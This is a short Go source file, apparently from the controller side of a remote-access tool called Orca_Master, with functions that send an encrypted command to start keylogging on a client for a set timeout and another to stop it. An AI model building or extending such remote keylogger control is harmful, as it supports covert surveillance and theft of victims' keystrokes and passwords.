package keyloggeropt

import (
	"Orca_Master/cli/common"
	"Orca_Master/define/config"
	"Orca_Master/tools/crypto"
	"strconv"
)

// 发送键盘记录请求
func SendKeyloggerRequestMsg(clientId, sendUserId string, timeout int) common.HttpRetData {
	msg := "keylogger"
	t := strconv.Itoa(timeout)
	data, _ := crypto.Encrypt([]byte(t), []byte(config.AesKey))
	return common.SendSuccessMsg(clientId, sendUserId, msg, data, "")
}

func SendKeyloggerQuit(clientId, sendUserId string) common.HttpRetData {
	msg := "keyloggerQuit"
	data := ""
	retData := common.SendSuccessMsg(clientId, sendUserId, msg, data, "")
	return retData
}
